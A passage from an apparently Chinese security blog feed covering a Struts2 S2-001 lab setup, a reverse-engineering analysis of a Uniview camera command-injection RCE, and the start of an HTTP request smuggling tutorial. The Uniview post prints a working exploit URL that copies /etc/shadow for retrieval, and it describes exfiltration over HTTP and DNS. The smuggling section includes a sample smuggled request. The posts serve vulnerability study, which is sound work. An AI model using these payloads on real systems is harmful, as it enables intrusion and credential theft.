class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span><br>         pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br>&lt;%@ taglib prefix=<span class="hljs-string">&quot;s&quot;</span> uri=<span class="hljs-string">&quot;/struts-tags&quot;</span> %&gt;<br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>&gt;<br>    &lt;title&gt;S2-001&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;p&gt;Hello &lt;s:property value=&quot;username&quot;&gt;&lt;/s:property&gt;&lt;/p&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><p>然后在<code>main</code>文件夹下创建一个<code>resources</code>文件夹，内部添加一个<code>struts.xml</code>，内容为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;S2-001&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.mengsec.s2001.action.LoginAction&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>welcome.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;error&quot;</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>创建完毕的目录如图所示：</p><p><img src="https://image.mengsec.com/struts/env/image-20191028212239345.png" alt="image-20191028212239345"></p><p>接下来配置Tomcat服务器，在Mac上的话，直接<code>brew install tomcat</code>即可安装<code>tomcat9</code>，安装的路径为<code>/usr/local/Cellar/tomcat/9.0.27</code>。</p><p>添加一个本地的Tomcat服务器。</p><p><img src="https://image.mengsec.com/struts/env/image-20191028212557928.png" alt="image-20191028212557928"></p><p>配置好Tomcat服务器的路径。</p><p><img src="https://image.mengsec.com/struts/env/image-20191028212649942.png" alt="image-20191028212649942"></p><p>在这里，默认的<code>8080</code>端口与<code>burp</code>的<code>8080</code>端口冲突了，我修改为<code>8008</code>端口了。</p><p><img src="https://image.mengsec.com/struts/env/image-20191028212837833.png" alt="image-20191028212837833"></p><p>然后再点击<code>Deployment</code>，添加一个<code>artifacts</code>。</p><p><img src="https://image.mengsec.com/struts/env/image-20191028212937692.png" alt="image-20191028212937692"></p><p>创建完毕后保存配置即可。</p><p>然后点击左上角的绿色三角就可以运行了。</p><p><img src="https://image.mengsec.com/struts/env/image-20191028213137196.png" alt="image-20191028213137196"></p><p>测试一下Payload，在username中输入</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%&#123;1+1&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/struts/env/image-20191028213237824.png" alt="image-20191028213237824"></p><p>至此我们的测试环境就搭建完毕了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java-Web</tag>
      
      <tag>折腾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Uniview RCE 漏洞分析</title>
    <link href="/2019/10/27/uniview-rce-analysis/"/>
    <url>/2019/10/27/uniview-rce-analysis/</url>
    
    <content type="html"><![CDATA[<p>Uniview RCE 漏洞分析，PoC来自<a href="https://www.exploit-db.com/exploits/43999">exploit-db</a></p><a id="more"></a><h2 id="1-漏洞复现"><a href="#1-漏洞复现" class="headerlink" title="1. 漏洞复现"></a>1. 漏洞复现</h2><p><strong>PoC</strong>:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">[Get <span class="hljs-regexp">/etc/</span>shadow]<br>http:<span class="hljs-regexp">//</span>IP:PORT<span class="hljs-regexp">/cgi-bin/m</span>ain-cgi?json=&#123;<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-number">264</span>,<span class="hljs-string">&quot;status&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;bSelectAllPort&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;stSelPort&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;bSelectAllIp&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;stSelIp&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;stSelNicName&quot;</span>:<span class="hljs-string">&quot;;cp%20/etc/shadow%20/tmp/packetcapture.pcap;&quot;</span>&#125;<br><br>[get the result]<br>http:<span class="hljs-regexp">//</span>IP:PORT<span class="hljs-regexp">/cgi-bin/m</span>ain-cgi?json=&#123;<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-number">265</span>,<span class="hljs-string">&quot;szUserName&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;u32UserLoginHandle&quot;</span>:-<span class="hljs-number">1</span>&#125;<br></code></pre></td></tr></table></figure><p>执行命令，将<code>/etc/shadow</code>文件复制到<code>/tmp/packetcapture.pcap</code>。</p><p><img src="https://image.mengsec.com/Uniview-RCE/1.png" alt="1"></p><p>获得<code>/etc/shadow</code>的内容。</p><p><img src="https://image.mengsec.com/Uniview-RCE/2.png" alt="2"></p><h2 id="2-漏洞详细分析"><a href="#2-漏洞详细分析" class="headerlink" title="2. 漏洞详细分析"></a>2. 漏洞详细分析</h2><p>对于该漏洞，我决定先利用<code>POC</code>去寻找漏洞点，然后逆着分析参数传递过程，来分析漏洞原理。</p><h3 id="2-1-根据POC寻找漏洞点"><a href="#2-1-根据POC寻找漏洞点" class="headerlink" title="2.1 根据POC寻找漏洞点"></a>2.1 根据POC寻找漏洞点</h3><p>根据<code>POC</code>来分析一下漏洞。</p><p>很明显，<code>POC</code>中<code>stSelNicName</code>这个参数传入了所执行的命令，使用IDA打开关键程序<code>main-cgi</code>，搜索字符串<code>stSelNicName</code>。</p><p><img src="https://image.mengsec.com/Uniview-RCE/3.png" alt="3"></p><p>进而找出存在该字符串的函数，<code>sub_2248C()</code>。<br>为了方便阅读，根据函数实现的功能，将函数名修改为<code>startTcpDump</code>。</p><p><img src="https://image.mengsec.com/Uniview-RCE/4.png" alt="4"></p><p>可以看到在该函数的后面，进行了命令的拼接，由此猜测，应该是前面没有做好对传入的参数进行过滤，进行拼接后就使用<code>system()</code>执行了代码。</p><p><img src="https://image.mengsec.com/Uniview-RCE/5.png" alt="5"></p><p>这里应该就是漏洞点了，接下来往上找一下调用，分析一下传参，来验证自己的猜想。</p><h3 id="2-2-参数传递过程分析"><a href="#2-2-参数传递过程分析" class="headerlink" title="2.2 参数传递过程分析"></a>2.2 参数传递过程分析</h3><p>首先往上查找调用<code>startTcpDump()</code>的函数。<br>找到<code>sub_477FC()</code></p><p><img src="https://image.mengsec.com/Uniview-RCE/6.png" alt="6"></p><p>再往上，就到了<code>CGI</code>请求开始处理的地方<code>sub_4E2A4()</code>。</p><p><img src="https://image.mengsec.com/Uniview-RCE/7.png" alt="7"><br>可以看到，程序在第<code>8</code>行获得了传入的请求数据<code>v0</code>，经过处理后传入关键函数<code>sub_477FC()</code>中。</p><p>跟进函数<code>getRequestValue()(也就是sub_164D0)</code>，</p><p>可以看到，当请求方法为<code>GET</code>时，该函数会获得并返回经过<code>URL</code>编码之后的数据，而且程序不支持<code>POST</code>请求。</p><p><img src="https://image.mengsec.com/Uniview-RCE/8.png" alt="8"></p><p>也就是说在<code>dealWithCGIRequest()</code>函数中，第<code>13</code>行<code>v2 = sub_477FC(v1);</code>传入的<code>v1</code>是一个字符串。<br>对于<code>POC</code>来说，就是</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">json=&#123;&quot;cmd&quot;:264,&quot;status&quot;:1,&quot;bSelectAllPort&quot;:1,&quot;stSelPort&quot;:0,&quot;bSelectAllIp&quot;:1,&quot;stSelIp&quot;:0,&quot;stSelNicName&quot;:&quot;;cp%20/etc/shadow%20/tmp/packetcapture.pcap;&quot;&#125;<br></code></pre></td></tr></table></figure><p>然后进入函数<code>sub_477FC()</code>，可以看到在第<code>237</code>-<code>269</code>，对传入的字符串进行了处理。</p><p><img src="https://image.mengsec.com/Uniview-RCE/9.png" alt="9"></p><p>从处理流程来看，使用<code>=</code>和<code>&amp;</code>对字符串进行分割，获取<code>key</code>和<code>value</code>，存储在<code>v5</code>中。<br><code>counter</code>中存储了传入的键值对的数目。</p><p><code>v5</code>的数据结构:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">key</span> \<span class="hljs-number">0</span> value \<span class="hljs-number">0</span> key \<span class="hljs-number">0</span> value \<span class="hljs-number">0</span> ....<br></code></pre></td></tr></table></figure><p>接下来函数对处理后的字符串进行遍历，处理请求。</p><p>首先对<code>Value</code>值进行<code>url</code>解码。</p><p><img src="https://image.mengsec.com/Uniview-RCE/10.png" alt="10"></p><p>然后继续往下：</p><p><img src="https://image.mengsec.com/Uniview-RCE/11.png" alt="11"></p><p>对于代码中的<code>v11</code>来说，它就是经过<code>urldecode</code>之后的<code>v5</code>。<br>也就是<code>*v11 == &quot;key&quot;</code>、<code>*(v11+32) == &quot;value&quot;</code>。<br>然后根据传入的<code>key</code>来决定处理方式，在<code>POC</code>中我们传入了一个<code>json</code>数据。</p><p>此时<code>343</code>行<code>if</code>条件成立，在<code>347</code>行，将<code>value</code>值传入函数<code>sub_4E204()</code>，对<code>json</code>字符串进行解析，返回一个存储了<code>json</code>的数据结构。<br>然后<code>351</code>行获得<code>cmd</code>的值，然后根据该值，使用<code>switch</code>来决定如何进行处理后续请求。</p><p>跟进<code>347</code>行<code>v23 = sub_4E204((v11 + 32));</code>，分析一下<code>json</code>的数据结构。<br>在这里我只是大致分析了下，动态调试环境弄不好，只能静态分析，后面还涉及到递归，有点困难。</p><p>往下走两步，跟进到<code>sub_4E164(a1, 0, 0);</code>，其中<code>a1</code>就是传入的<code>value</code>值。<br>后面的分析过程太过于繁琐，而且并没有分析出有关数据的过滤的函数，就说一下我分析的<code>json</code>的数据结构吧。</p><blockquote><p>在<code>json</code>中有六种数据，分别是数字（整数或者浮点数）、字符串、逻辑值 （<code>true</code>或<code>false</code>）、数组、对象、<code>null</code>。</p></blockquote><p>在该程序中，是通过调用<code>getFortySpace()</code>(<code>也就是sub_4CA70</code>)来分配空间的，</p><p><img src="https://image.mengsec.com/Uniview-RCE/12.png" alt="12"></p><p>根据整个流程调用来判断，存储<code>json</code>中键值对的数据结构如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">result[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">//指向下一个对象</span><br>result[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">//指向上一个对象</span><br>result[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">//指向嵌套的数组或者对象</span><br>result[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">//种类 0 == false、1 == true、2 == null、3 == 数字、4 == 字符串、5 == 数组、6 == 对象</span><br>result[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">//字符串</span><br>result[<span class="hljs-number">5</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">//整数</span><br>result[<span class="hljs-number">6</span>] = <span class="hljs-number">0</span>;<br>result[<span class="hljs-number">7</span>] = <span class="hljs-number">0</span>;<br>result[<span class="hljs-number">8</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">//当前键值对的key值</span><br>result[<span class="hljs-number">9</span>] = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>猜测使用了<code>cjson</code>这个库。</p><p>在解析<code>json</code>的流程中，只是调用了<code>leftStrip()</code>(也就是<code>sub_4C788</code>)，来保证所有字符串都以可见字符开头。</p><p><img src="https://image.mengsec.com/Uniview-RCE/13.png" alt="13"></p><p>在获取双引号之间的值时处理<code>unicode</code>编码，没有其他的针对性的过滤手段。</p><p><img src="https://image.mengsec.com/Uniview-RCE/14.png" alt="14"></p><p>然后回到函数<code>sub_477FC()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">v23 = sub_4E204((v11 + <span class="hljs-number">32</span>));              <span class="hljs-comment">// 推测该方法用来解析json字符串</span><br>v24 = v23;<br><span class="hljs-keyword">if</span> ( !v23 )<br>    formatStr(<span class="hljs-string">&quot;cgi_common.c&quot;</span>, <span class="hljs-number">2284</span>, <span class="hljs-string">&quot;CGI_COMMON_ProcessData&quot;</span>, <span class="hljs-string">&quot;json_Req is :\&quot;NULL\&quot;.&quot;</span>);<br>dest = getValueByKey(v24, <span class="hljs-string">&quot;cmd&quot;</span>)[<span class="hljs-number">5</span>];<br>formatStr(<span class="hljs-string">&quot;cgi_common.c&quot;</span>, <span class="hljs-number">2289</span>, <span class="hljs-string">&quot;CGI_COMMON_ProcessData&quot;</span>, <span class="hljs-string">&quot;Begin to process transcat.&quot;</span>);<br>v25 = sub_4CAC4();                        <span class="hljs-comment">// 获得一个result[3] == 6的空间</span><br>formatStr(<span class="hljs-string">&quot;cgi_common.c&quot;</span>, <span class="hljs-number">2293</span>, <span class="hljs-string">&quot;CGI_COMMON_ProcessData&quot;</span>, <span class="hljs-string">&quot;Web id = %d&quot;</span>, dest);<br><span class="hljs-keyword">switch</span> ( dest )s<br>&#123;<br>    ...<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">264u</span>:<br>        v22 = startTcpDump(v24);<span class="hljs-comment">//命令执行的关键函数。</span><br>        <span class="hljs-keyword">break</span>;<br>    ...<br></code></pre></td></tr></table></figure><p>到现在，传入的<code>json</code>数据已经进入前面我们之前猜测的漏洞点了。</p><h3 id="2-3-漏洞点详细分析"><a href="#2-3-漏洞点详细分析" class="headerlink" title="2.3 漏洞点详细分析"></a>2.3 漏洞点详细分析</h3><p>重新回到函数<code>startTcpDump(int a1)</code>中。</p><p><code>25</code>行到<code>51</code>行程序对系统状态进行判断。</p><p><img src="https://image.mengsec.com/Uniview-RCE/15.png" alt="15"></p><p>根据上面的条件，我们必须传入<code>bSelectAllPort</code>、<code>bSelectAllIP</code>、<code>stSelIp</code>、<code>stSelPort</code>、<code>stSelNicName</code>这五个值。</p><p>在后面可以看到，四个不同条件下的命令执行语句都拼接了<code>stSelNicName</code>字符串。</p><p><img src="https://image.mengsec.com/Uniview-RCE/16.png" alt="16"></p><p>每个都分析下。</p><p>第一条</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">bSelectAllIp[<span class="hljs-number">5</span>] == <span class="hljs-number">0</span><br>bSelectAllPort[<span class="hljs-number">5</span>] == <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>第二条</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">bSelectAllIp[<span class="hljs-number">5</span>] == <span class="hljs-number">0</span><br>bSelectAllPort[<span class="hljs-number">5</span>] == <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>第三条</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">bSelectAllIp[<span class="hljs-number">5</span>] == <span class="hljs-number">1</span><br>bSelectAllPort[<span class="hljs-number">5</span>] == <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>第四条</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">bSelectAllIp[<span class="hljs-number">5</span>] == <span class="hljs-number">1</span><br>bSelectAllPort[<span class="hljs-number">5</span>] == <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>可以知道，在传入的参数中，<code>bSelectAllIp</code>和<code>bSelectAllPort</code>只要都存在并且值是<code>0</code>或者<code>1</code>。就能够将<code>stSelNicName</code>的值拼接到执行的命令中。</p><p>在这命令中，</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">tcpdump -<span class="hljs-selector-tag">i</span> %s -<span class="hljs-selector-tag">p</span> -nn ....<br></code></pre></td></tr></table></figure><p>其中<code>%s</code>的值可控，于是我们可以使用分号来截断命令。<br>比如传入<code>;id;</code>，则此时执行的命令为<code>tcpdump -i ;id; -p -nn ….</code>，命令<code>id</code>成功执行。<br>就这样实现命令注入，造成远程代码执行。</p><p>从总体来看，该漏洞产生的最主要的原因就是，程序没有对传入的参数进行过滤，然后直接将其拼接到了命令中，造成了远程命令执行。</p><h2 id="3-漏洞攻击利用思路"><a href="#3-漏洞攻击利用思路" class="headerlink" title="3. 漏洞攻击利用思路"></a>3. 漏洞攻击利用思路</h2><p>这是一个无回显的远程命令执行漏洞，不过既然能够执行命令了，就有很多利用方式了。</p><h3 id="3-1-利用程序本身的功能"><a href="#3-1-利用程序本身的功能" class="headerlink" title="3.1 利用程序本身的功能"></a>3.1 利用程序本身的功能</h3><p>在该程序中提供了下载数据包的功能，文件路径为<code>/tmp/packetcapture.pcap</code>，我们可以执行命令，将输出重定向到该文件中，然后利用程序自身功能来下载到结果。<br>如果在<code>Web</code>目录中有权限，也可以直接将结果输出到<code>Web</code>目录下，然后下载得到结果。</p><h3 id="3-2-使用HTTP请求和DNS解析外带数据"><a href="#3-2-使用HTTP请求和DNS解析外带数据" class="headerlink" title="3.2 使用HTTP请求和DNS解析外带数据"></a>3.2 使用HTTP请求和DNS解析外带数据</h3><p>如果目标主机可以连通外网，可以让目标主机向外网的一个自己可控的Web服务器发出携带数据的<code>HTTP</code>请求，从而将获得命令执行的结果。<br>也可以使目标主机解析携带有数据的二级域名，然后查询<code>DNS</code>解析记录。</p><p>我们可以使用<code>ceye.io</code>这个平台来达到目的。</p><p>使用<code>curl</code>向平台发起HTTP请求获取命令执行的结果。</p><p><img src="https://image.mengsec.com/Uniview-RCE/20.png" alt="20"></p><p>成功获取执行命令的内容。</p><p><img src="https://image.mengsec.com/Uniview-RCE/19.png" alt="19"></p><p>使用<code>DNS</code>请求获取数据</p><p><img src="https://image.mengsec.com/Uniview-RCE/21.png" alt="21"></p><p>成功获取执行命令的内容</p><p><img src="https://image.mengsec.com/Uniview-RCE/22.png" alt="22"></p><p>需要注意的是，在外带数据的时候应该要对数据<code>base64</code>编码一下，或者其他编码也可以，防止特殊字符对命令的执行过程产生影响。我这个树莓派上没有<code>base64</code>，在这就不演示了。</p><h3 id="3-3-一点发现"><a href="#3-3-一点发现" class="headerlink" title="3.3 一点发现"></a>3.3 一点发现</h3><p>在漏洞分析过程中，发现该漏洞是有回显的，执行的命令会在请求头里出现。<br>只要执行的命令存在标准输出，即使用<code>echo</code>，而且输出内容中存在<code>:</code>，即可在响应头中获得命令执行的结果。</p><p><img src="https://image.mengsec.com/Uniview-RCE/23.png" alt="23"></p><p>但是在分析漏洞点中没有发现获取命令结果的地方。<br>我认为应该是<code>CGI</code>程序将标准输出重定向到<code>Web</code>服务器上，内容中有<code>:</code>，符合响应头的标准，将内容成功输出。<br>从而获取到命令执行的结果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>命令执行</tag>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>协议层的攻击——HTTP Request Smuggling</title>
    <link href="/2019/10/10/http-request-smugging/"/>
    <url>/2019/10/10/http-request-smugging/</url>
    
    <content type="html"><![CDATA[<p>本文是我最近学习HTTP请求走私攻击的一些记录，首发<a href="https://paper.seebug.org/1048/">paper.seebug.org</a></p><a id="more"></a><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>最近在学习研究BlackHat的议题，其中有一篇议题——“HTTP Desync Attacks: Smashing into the Cell Next Door”引起了我极大地兴趣，在其中，作者讲述了HTTP走私攻击这一攻击手段，并且分享了他的一些攻击案例。我之前从未听说过这一攻击方式，决定对这一攻击方式进行一个完整的学习梳理，于是就有了这一篇文章。</p><p>当然了，作为这一攻击方式的初学者，难免会有一些错误，还请诸位斧正。</p><h2 id="2-发展时间线"><a href="#2-发展时间线" class="headerlink" title="2. 发展时间线"></a>2. 发展时间线</h2><p>最早在2005年，由Chaim Linhart，Amit Klein，Ronen Heled和Steve Orrin共同完成了一篇关于HTTP Request Smuggling这一攻击方式的报告。通过对整个RFC文档的分析以及丰富的实例，证明了这一攻击方式的危害性。</p><blockquote><p><a href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf">https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf</a></p></blockquote><p>在2016年的DEFCON 24 上，@regilero在他的议题——Hiding Wookiees in HTTP中对前面报告中的攻击方式进行了丰富和扩充。</p><blockquote><p><a href="https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf">https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf</a></p></blockquote><p>在2019年的BlackHat USA 2019上，PortSwigger的James Kettle在他的议题——HTTP Desync Attacks: Smashing into the Cell Next Door中针对当前的网络环境，展示了使用分块编码来进行攻击的攻击方式，扩展了攻击面，并且提出了完整的一套检测利用流程。</p><blockquote><p><a href="https://www.blackhat.com/us-19/briefings/schedule/#http-desync-attacks-smashing-into-the-cell-next-door-15153">https://www.blackhat.com/us-19/briefings/schedule/#http-desync-attacks-smashing-into-the-cell-next-door-15153</a></p></blockquote><h2 id="3-产生原因"><a href="#3-产生原因" class="headerlink" title="3. 产生原因"></a>3. 产生原因</h2><p>HTTP请求走私这一攻击方式很特殊，它不像其他的Web攻击方式那样比较直观，它更多的是在复杂网络环境下，不同的服务器对RFC标准实现的方式不同，程度不同。这样一来，对同一个HTTP请求，不同的服务器可能会产生不同的处理结果，这样就产生了了安全风险。</p><p>在进行后续的学习研究前，我们先来认识一下如今使用最为广泛的<code>HTTP 1.1</code>的协议特性——<code>Keep-Alive&amp;Pipeline</code>。</p><p>在<code>HTTP1.0</code>之前的协议设计中，客户端每进行一次HTTP请求，就需要同服务器建立一个TCP链接。而现代的Web网站页面是由多种资源组成的，我们要获取一个网页的内容，不仅要请求HTML文档，还有JS、CSS、图片等各种各样的资源，这样如果按照之前的协议设计，就会导致HTTP服务器的负载开销增大。于是在<code>HTTP1.1</code>中，增加了<code>Keep-Alive</code>和<code>Pipeline</code>这两个特性。</p><p>所谓<code>Keep-Alive</code>，就是在HTTP请求中增加一个特殊的请求头<code>Connection: Keep-Alive</code>，告诉服务器，接收完这次HTTP请求后，不要关闭TCP链接，后面对相同目标服务器的HTTP请求，重用这一个TCP链接，这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。当然，这个特性在<code>HTTP1.1</code>中是默认开启的。</p><p>有了<code>Keep-Alive</code>之后，后续就有了<code>Pipeline</code>，在这里呢，客户端可以像流水线一样发送自己的HTTP请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。</p><p>现如今，浏览器默认是不启用<code>Pipeline</code>的，但是一般的服务器都提供了对<code>Pipleline</code>的支持。</p><p>为了提升用户的浏览速度，提高使用体验，减轻服务器的负担，很多网站都用上了CDN加速服务，最简单的加速服务，就是在源站的前面加上一个具有缓存功能的反向代理服务器，用户在请求某些静态资源时，直接从代理服务器中就可以获取到，不用再从源站所在服务器获取。这就有了一个很典型的拓扑结构。</p><p><img src="https://image.mengsec.com/request-smugging/Topology.png" alt="Topology"></p><p>一般来说，反向代理服务器与后端的源站服务器之间，会重用TCP链接。这也很容易理解，用户的分布范围是十分广泛，建立连接的时间也是不确定的，这样TCP链接就很难重用，而代理服务器与后端的源站服务器的IP地址是相对固定，不同用户的请求通过代理服务器与源站服务器建立链接，这两者之间的TCP链接进行重用，也就顺理成章了。</p><p>当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</p><h3 id="3-1-CL不为0的GET请求"><a href="#3-1-CL不为0的GET请求" class="headerlink" title="3.1 CL不为0的GET请求"></a>3.1 CL不为0的GET请求</h3><p>其实在这里，影响到的并不仅仅是GET请求，所有不携带请求体的HTTP请求都有可能受此影响，只因为GET比较典型，我们把它作为一个例子。</p><p>在<code>RFC2616</code>中，没有对GET请求像POST请求那样携带请求体做出规定，在最新的<code>RFC7231</code>的4.3.1节中也仅仅提了一句。</p><blockquote><p><a href="https://tools.ietf.org/html/rfc7231#section-4.3.1">https://tools.ietf.org/html/rfc7231#section-4.3.1</a></p><p>sending a payload body on a GET request might cause some existing implementations to reject the request</p></blockquote><p>假设前端代理服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的<code>Content-Length</code>头，不进行处理。这就有可能导致请求走私。</p><p>比如我们构造请求</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: example.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 44<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><br>GET / secret HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: example.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>前端服务器收到该请求，通过读取<code>Content-Length</code>，判断这是一个完整的请求，然后转发给后端服务器，而后端服务器收到后，因为它不对<code>Content-Length</code>进行处理，由于<code>Pipeline</code>的存在，它就认为这是收到了两个请求，分别是</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">第一个<br>GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: example.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><br>第二个<br>GET / secret HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: example.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><br></code></pre></td></tr></table></figure><p>这就导致了请求走私。在本文的4.3.1小节有一个类似于这一攻击方式的实例，推荐结合起来看下。</p><h3 id="3-2-CL-CL"><a href="#3-2-CL-CL" class="headerlink" title="3.2 